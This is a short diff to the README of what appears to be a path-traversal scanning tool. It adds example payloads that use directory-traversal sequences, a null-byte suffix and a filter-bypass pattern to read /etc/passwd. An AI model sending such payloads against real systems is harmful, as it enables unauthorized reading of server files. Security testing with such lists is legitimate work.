@@ -26,6 +26,15 @@ This uses separate payloads, if you want to add a custom payload, go to:
 ```bash
 /db/payloads.txt
 ```
+
+```bash
+/etc/passwd
+../../../../../../../../../../../etc/passwd
+/../../../../../../../../../../../../etc/passwd
+/..././..././..././..././..././..././..././etc/passwd%00
+../../../../../../../..//etc/passwd
+```
+
 ### Dork
 
 ```bash
